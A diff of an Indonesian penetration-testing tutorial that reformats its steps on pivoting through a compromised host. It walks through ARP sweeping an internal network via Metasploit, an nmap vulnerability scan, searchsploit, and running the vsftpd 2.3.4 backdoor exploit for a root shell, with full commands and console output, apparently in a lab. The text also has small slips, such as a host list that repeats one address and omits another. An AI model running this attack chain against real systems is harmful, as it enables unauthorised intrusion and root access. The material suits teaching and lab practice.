@@ -122,273 +122,273 @@ Ada dua jenis pivoting:
 
 ### 3. Gunakan Modul `auxiliary/scanner` Melalui Route
 
-   Kamu sekarang bisa melakukan scanning ke internal network.
+   1. Kamu sekarang bisa melakukan scanning ke internal network.
 
-   Contoh scanning semua host yang ada di internal:
+      Contoh scanning semua host yang ada di internal:
 
-   ```
-   use auxiliary/scanner/discovery/arp_sweep
-   set RHOSTS 192.168.1.0/24
-   set verbose true
-   run
-   ```
+      ```
+      use auxiliary/scanner/discovery/arp_sweep
+      set RHOSTS 192.168.1.0/24
+      set verbose true
+      run
+      ```
 
-   Ini akan meng-scan semua host yang up/aktif yang ada di jaringan yang sama, mulai dari host dengan alamat IP `192.168.1.1` sampai dengan host dengan alamat IP `192.168.1.254`.
+      Ini akan meng-scan semua host yang up/aktif yang ada di jaringan yang sama, mulai dari host dengan alamat IP `192.168.1.1` sampai dengan host dengan alamat IP `192.168.1.254`.
 
-   Hasil output-nya seperti ini:
+      Hasil output-nya seperti ini:
 
-   ```
-   msf6 auxiliary(scanner/discovery/arp_sweep) > set rhosts 192.168.1.0/24
-   rhosts => 192.168.1.0/24
-   msf6 auxiliary(scanner/discovery/arp_sweep) > set verbose true 
-   verbose => true
-   msf6 auxiliary(scanner/discovery/arp_sweep) > run
-   [+] 192.168.1.1 appears to be up (UNKNOWN).
-   [+] 192.168.1.4 appears to be up (UNKNOWN).
-   [+] 192.168.1.7 appears to be up (UNKNOWN).
-   [+] 192.168.1.12 appears to be up (UNKNOWN).
-   [+] 192.168.1.45 appears to be up (CADMUS COMPUTER SYSTEMS).
-   [+] 192.168.1.47 appears to be up (UNKNOWN).
-   [+] 192.168.1.48 appears to be up (CADMUS COMPUTER SYSTEMS).
-   [+] 192.168.1.42 appears to be up (ALFA, INC.).
-   [*] Scanned 256 of 256 hosts (100% complete)
-   [*] Auxiliary module execution completed
-   msf6 auxiliary(scanner/discovery/arp_sweep) > 
-   ```
+      ```
+      msf6 auxiliary(scanner/discovery/arp_sweep) > set rhosts 192.168.1.0/24
+      rhosts => 192.168.1.0/24
+      msf6 auxiliary(scanner/discovery/arp_sweep) > set verbose true 
+      verbose => true
+      msf6 auxiliary(scanner/discovery/arp_sweep) > run
+      [+] 192.168.1.1 appears to be up (UNKNOWN).
+      [+] 192.168.1.4 appears to be up (UNKNOWN).
+      [+] 192.168.1.7 appears to be up (UNKNOWN).
+      [+] 192.168.1.12 appears to be up (UNKNOWN).
+      [+] 192.168.1.45 appears to be up (CADMUS COMPUTER SYSTEMS).
+      [+] 192.168.1.47 appears to be up (UNKNOWN).
+      [+] 192.168.1.48 appears to be up (CADMUS COMPUTER SYSTEMS).
+      [+] 192.168.1.42 appears to be up (ALFA, INC.).
+      [*] Scanned 256 of 256 hosts (100% complete)
+      [*] Auxiliary module execution completed
+      msf6 auxiliary(scanner/discovery/arp_sweep) > 
+      ```
 
-   Dari hasil scan tersebut, ditemukan `8` host yang aktif dengan alamat IP Address sebagai berikut:
-   - `192.168.1.1`
-   - `192.168.1.4`
-   - `192.168.1.7`
-   - `192.168.1.12`
-   - `192.168.1.42`
-   - `192.168.1.45`
-   - `192.168.1.47`
-   - `192.168.1.45`
+      Dari hasil scan tersebut, ditemukan `8` host yang aktif dengan alamat IP Address sebagai berikut:
+      - `192.168.1.1`
+      - `192.168.1.4`
+      - `192.168.1.7`
+      - `192.168.1.12`
+      - `192.168.1.42`
+      - `192.168.1.45`
+      - `192.168.1.47`
+      - `192.168.1.45`
 
-   Buat file `host.txt`:
+   2. Buat File `host.txt`:
 
-   ```
-   nano host.txt
-   ```
+      ```
+      nano host.txt
+      ```
 
-   Isi dengan:
+   3. Isi dengan:
 
-   ```
-   192.168.1.1
-   192.168.1.4
-   192.168.1.7
-   192.168.1.12
-   192.168.1.42
-   192.168.1.47
-   192.168.1.48
-   ```
+      ```
+      192.168.1.1
+      192.168.1.4
+      192.168.1.7
+      192.168.1.12
+      192.168.1.42
+      192.168.1.47
+      192.168.1.48
+      ```
 
-   Kenapa host dengan alamat IP Address `192.168.1.45` tidak diikutsertakan? karena host tersebut sudah dieksploitasi alias sudah menjadi jembatan pertama untuk mengeksploitasi host-host yang lain.
+      Kenapa host dengan alamat IP Address `192.168.1.45` tidak diikutsertakan? karena host tersebut sudah dieksploitasi alias sudah menjadi jembatan pertama untuk mengeksploitasi host-host yang lain.
 
-   Scan host-host tersebut menggunakan `Nmap`:
+   4. Scan Host-host Tersebut Menggunakan `Nmap`:
 
-   ```
-   sudo nmap -sS -sV -T4 -O --script vuln -iL host.txt
-   ```
+      ```
+      sudo nmap -sS -sV -T4 -O --script vuln -iL host.txt
+      ```
 
-   Keterangan:
-   - `-sS`: Menggunakan teknik `SYN` scan (stealth)
-   - `-sV`: Mengaktifkan scan versi pada service yang discan
-   - `-T4`: Templat waktu (semakin tinggi semakin cepat)
-   - `-O`: Mengaktifkan scan OS (sistem operasi)
-   - `--script vuln`: Jalankan semua skrip kategori vuln (vulnerability detection)
-   - `-iL`: File yang berisi daftar host yang ingin di-scan: `host.txt`
+      Keterangan:
+      - `-sS`: Menggunakan teknik `SYN` scan (stealth)
+      - `-sV`: Mengaktifkan scan versi pada service yang discan
+      - `-T4`: Templat waktu (semakin tinggi semakin cepat)
+      - `-O`: Mengaktifkan scan OS (sistem operasi)
+      - `--script vuln`: Jalankan semua skrip kategori vuln (vulnerability detection)
+      - `-iL`: File yang berisi daftar host yang ingin di-scan: `host.txt`
 
-   Hasil output-nya seperti ini:
+      Hasil output-nya seperti ini:
 
-   ```
-   msf6 auxiliary(scanner/discovery/arp_sweep) > sudo nmap -sS -sV -T4 -O --script vuln -iL host.txt
-   [*] exec: nmap -sS -sV -T4 -O --script vuln -iL host.txt
+      ```
+      msf6 auxiliary(scanner/discovery/arp_sweep) > sudo nmap -sS -sV -T4 -O --script vuln -iL host.txt
+      [*] exec: nmap -sS -sV -T4 -O --script vuln -iL host.txt
 
-   Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 06:14 WIB
+      Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 06:14 WIB
 
-   Nmap scan report for 192.168.1.48
-   Host is up (0.00061s latency).
-   Not shown: 977 closed tcp ports (reset)
-   PORT     STATE SERVICE     VERSION
-   21/tcp   open  ftp         vsftpd 2.3.4
-   | ftp-vsftpd-backdoor: 
-   |   VULNERABLE:
-   |   vsFTPd version 2.3.4 backdoor
-   |     State: VULNERABLE (Exploitable)
-   |     IDs:  CVE:CVE-2011-2523  BID:48539
-   |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
-   |     Disclosure date: 2011-07-03
-   |     Exploit results:
-   |       Shell command: id
-   |       Results: uid=0(root) gid=0(root)
-   |     References:
-   |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
-   |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
-   |       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
-   |_      https://www.securityfocus.com/bid/48539
-   | vulners: 
-   |   vsftpd 2.3.4: 
-   |     	PACKETSTORM:162145	10.0	https://vulners.com/packetstorm/PACKETSTORM:162145	*EXPLOIT*
-   |     	EDB-ID:49757	9.8	https://vulners.com/exploitdb/EDB-ID:49757	*EXPLOIT*
-   |     	CVE-2011-2523	9.8	https://vulners.com/cve/CVE-2011-2523
-   |_    	1337DAY-ID-36095	9.8	https://vulners.com/zdt/1337DAY-ID-36095	*EXPLOIT*
-   ```
+      Nmap scan report for 192.168.1.48
+      Host is up (0.00061s latency).
+      Not shown: 977 closed tcp ports (reset)
+      PORT     STATE SERVICE     VERSION
+      21/tcp   open  ftp         vsftpd 2.3.4
+      | ftp-vsftpd-backdoor: 
+      |   VULNERABLE:
+      |   vsFTPd version 2.3.4 backdoor
+      |     State: VULNERABLE (Exploitable)
+      |     IDs:  CVE:CVE-2011-2523  BID:48539
+      |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+      |     Disclosure date: 2011-07-03
+      |     Exploit results:
+      |       Shell command: id
+      |       Results: uid=0(root) gid=0(root)
+      |     References:
+      |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+      |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+      |       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+      |_      https://www.securityfocus.com/bid/48539
+      | vulners: 
+      |   vsftpd 2.3.4: 
+      |     	PACKETSTORM:162145	10.0	https://vulners.com/packetstorm/PACKETSTORM:162145	*EXPLOIT*
+      |     	EDB-ID:49757	9.8	https://vulners.com/exploitdb/EDB-ID:49757	*EXPLOIT*
+      |     	CVE-2011-2523	9.8	https://vulners.com/cve/CVE-2011-2523
+      |_    	1337DAY-ID-36095	9.8	https://vulners.com/zdt/1337DAY-ID-36095	*EXPLOIT*
+      ```
 
-   Dari hasil scan tersebut, ditemukan vulnerability pada service FTP dengan versi `vsftpd 2.3.4` pada host `192.168.1.48`.
+      Dari hasil scan tersebut, ditemukan vulnerability pada service `FTP` dengan versi `vsftpd 2.3.4` pada host `192.168.1.48`.
 
-   Kalian juga bisa cek apakah kerentanan tersebut ada atau tidak di Exploit-DB dmenggunakan `searchsploit`:
+   5. Kalian juga bisa cek apakah kerentanan tersebut ada atau tidak di Exploit-DB dmenggunakan `searchsploit`:
 
-   ```
-   searchsploit vsftpd 2.3.4
-   ```
+      ```
+      searchsploit vsftpd 2.3.4
+      ```
 
-   Hasil output-nya seperti ini:
+      Hasil output-nya seperti ini:
 
-   ```
-   msf6 auxiliary(scanner/discovery/arp_sweep) > searchsploit vsftpd 2.3.4
-   [*] exec: searchsploit vsftpd 2.3.4
+      ```
+      msf6 auxiliary(scanner/discovery/arp_sweep) > searchsploit vsftpd 2.3.4
+      [*] exec: searchsploit vsftpd 2.3.4
 
-   --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-    Exploit Title                                                                                                                                                                   |  Path
-   --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-   vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py
-   vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb
-   --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-   Shellcodes: No Results
-   ```
+      --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+       Exploit Title                                                                                                                                                                   |  Path
+      --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+      vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py
+      vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb
+      --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+      Shellcodes: No Results
+      ```
 
-   Dari hasil pencarian menggunakan `searchsploit`, ditemukan sebuah exploit di Exploit-DB dengan judul `vsftpd 2.3.4`.
+      Dari hasil pencarian menggunakan `searchsploit`, ditemukan sebuah exploit di Exploit-DB dengan judul `vsftpd 2.3.4`.
 
 ### 4. Lanjutkan Eksploitasi ke Mesin Internal
 
-   Setelah menemukan host yang aktif dan host tersebut memiliki kerentanan (vulnerability). Maka tahap selanjutnya adalah mengeksploitasi host tersebut sesuai dengan vulnerability-nya. Disini berhubung kerentanannya ada pada service `FTP` dengan versi `vsftpd 2.3.4`, kita cari kerentanan tersebut dengan:
+   1. Setelah menemukan host yang aktif dan host tersebut memiliki kerentanan (vulnerability). Maka tahap selanjutnya adalah mengeksploitasi host tersebut sesuai dengan vulnerability-nya. Disini berhubung kerentanannya ada pada service `FTP` dengan versi `vsftpd 2.3.4`, kita cari kerentanan tersebut dengan:
 
-   ```
-   search vsftpd 2.3.4
-   ```
+      ```
+      search vsftpd 2.3.4
+      ```
 
-   Hasil output-nya seperti ini:
+      Hasil output-nya seperti ini:
 
-   ```
-   msf6 auxiliary(scanner/discovery/arp_sweep) > search vsftpd 2.3.4
+      ```
+      msf6 auxiliary(scanner/discovery/arp_sweep) > search vsftpd 2.3.4
 
-   Matching Modules
-   ================
+      Matching Modules
+      ================
 
-      #  Name                                  Disclosure Date  Rank       Check  Description
-      -  ----                                  ---------------  ----       -----  -----------
-      0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
-
-
-   Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
-   ```
-
-   Dari hasil tersebut ditemukan exploit `VSFTPD v2.3.4 Backdoor Command Execution` dengan nama modul `exploit/unix/ftp/vsftpd_234_backdoor`.
-
-   Gunakan modul tersebut:
-
-   ```
-   use exploit/unix/ftp/vsftpd_234_backdoor
-   ```
-
-   Atau bisa dengan:
-
-   ```
-   use 0
-   ```
-
-   > Angka `0` itu ID dari modul Metasploit.
-
-   Lihat opsi konfigurasi:
-
-   ```
-   show options
-   ```
-
-   Hasil output-nya seperti ini:
-
-   ```
-   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options 
-
-   Module options (exploit/unix/ftp/vsftpd_234_backdoor):
-
-      Name     Current Setting  Required  Description
-      ----     ---------------  --------  -----------
-      CHOST                     no        The local client address
-      CPORT                     no        The local client port
-      Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
-      RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-      RPORT    21               yes       The target port (TCP)
+         #  Name                                  Disclosure Date  Rank       Check  Description
+         -  ----                                  ---------------  ----       -----  -----------
+         0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
 
 
-   Exploit target:
+      Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+      ```
 
-      Id  Name
-      --  ----
-      0   Automatic
+      Dari hasil tersebut ditemukan exploit `VSFTPD v2.3.4 Backdoor Command Execution` dengan nama modul `exploit/unix/ftp/vsftpd_234_backdoor`.
+
+   2. Gunakan Modul Tersebut:
+
+      ```
+      use exploit/unix/ftp/vsftpd_234_backdoor
+      ```
+
+      Atau bisa dengan:
+
+      ```
+      use 0
+      ```
+
+      > Angka `0` itu ID dari modul Metasploit.
+
+   3. Lihat Opsi Konfigurasi:
+
+      ```
+      show options
+      ```
+
+      Hasil output-nya seperti ini:
+
+      ```
+      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options 
+
+      Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+         Name     Current Setting  Required  Description
+         ----     ---------------  --------  -----------
+         CHOST                     no        The local client address
+         CPORT                     no        The local client port
+         Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+         RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+         RPORT    21               yes       The target port (TCP)
+
+
+      Exploit target:
+
+         Id  Name
+         --  ----
+         0   Automatic
 
 
 
-   View the full module info with the info, or info -d command.
-   ```
+      View the full module info with the info, or info -d command.
+      ```
 
-   Setting target:
+   3. Setting Target:
 
-   ```
-   set PAYLOAD cmd/unix/interact
-   set RHOSTS 192.168.1.48
-   set RPORT 21
-   set verbose true
-   ```
+      ```
+      set PAYLOAD cmd/unix/interact
+      set RHOSTS 192.168.1.48
+      set RPORT 21
+      set verbose true
+      ```
 
-   Jalankan exploit:
+   4. Jalankan Exploit:
 
-   ```
-   exploit
-   ```
+      ```
+      exploit
+      ```
 
-   Kalau hasil output-nya seperti ini:
+      Kalau hasil output-nya seperti ini:
 
-   ```
-   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
-   PAYLOAD => cmd/unix/interact
-   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.48
-   RHOSTS => 192.168.1.48
-   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
-   RPORT => 21
-   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set verbose true
-   verbose => true
-   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 
-   [*] 192.168.1.48:21 - Banner: 220 (vsFTPd 2.3.4)
-   [*] 192.168.1.48:21 - USER: 331 Please specify the password.
-   [+] 192.168.1.48:21 - Backdoor service has been spawned, handling...
-   [+] 192.168.1.48:21 - UID: uid=0(root) gid=0(root)
-   [*] Found shell.
-   [*] Command shell session 5 opened (192.168.1.45:49166 -> 192.168.1.48:6200 via session 4) at 2025-05-10 05:59:37 +070
-   ```
+      ```
+      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
+      PAYLOAD => cmd/unix/interact
+      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.48
+      RHOSTS => 192.168.1.48
+      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
+      RPORT => 21
+      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set verbose true
+      verbose => true
+      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 
+      [*] 192.168.1.48:21 - Banner: 220 (vsFTPd 2.3.4)
+      [*] 192.168.1.48:21 - USER: 331 Please specify the password.
+      [+] 192.168.1.48:21 - Backdoor service has been spawned, handling...
+      [+] 192.168.1.48:21 - UID: uid=0(root) gid=0(root)
+      [*] Found shell.
+      [*] Command shell session 5 opened (192.168.1.45:49166 -> 192.168.1.48:6200 via session 4) at 2025-05-10 05:59:37 +070
+      ```
 
-   Itu artinya exploit kita terhadap service `FTP` dengan versi `vsftpd 2.3.4` berhasil dilakukan. dan kita bisa melakukan apa saja di dalam mesin target.
+      Itu artinya exploit kita terhadap service `FTP` dengan versi `vsftpd 2.3.4` berhasil dilakukan. dan kita bisa melakukan apa saja di dalam mesin target.
 
-   Contohnya:
+      Contohnya:
 
-   Menampilkan nama user yang sedang aktif pada sesi ini:
+      Menampilkan nama user yang sedang aktif pada sesi ini:
   
-   ```
-   whoami
-   ```
+      ```
+      whoami
+      ```
 
-   Hasil output-nya seperti ini:
+      Hasil output-nya seperti ini:
 
-   ```
-   [*] Command shell session 5 opened (192.168.1.45:49166 -> 192.168.1.48:6200 via session 4) at 2025-05-10 05:59:37 +0700
+      ```
+      [*] Command shell session 5 opened (192.168.1.45:49166 -> 192.168.1.48:6200 via session 4) at 2025-05-10 05:59:37 +0700
 
-   whoami
-   root
-   ```
+      whoami
+      root
+      ```
 
-   Dari hasil `whoami`, user yang aktif pada sesi ini adalah user `root`.
+      Dari hasil `whoami`, user yang aktif pada sesi ini adalah user `root`.
 
 ### Tips Tambahan
 - Gunakan `arp` di Meterpreter untuk melihat host yang pernah diakses:
@@ -397,7 +397,7 @@ Ada dua jenis pivoting:
   meterpreter > arp
   ```
 
-- Gunakan netstat untuk lihat koneksi:
+- Gunakan `netstat` untuk lihat koneksi:
 
   ```
   meterpreter > netstat
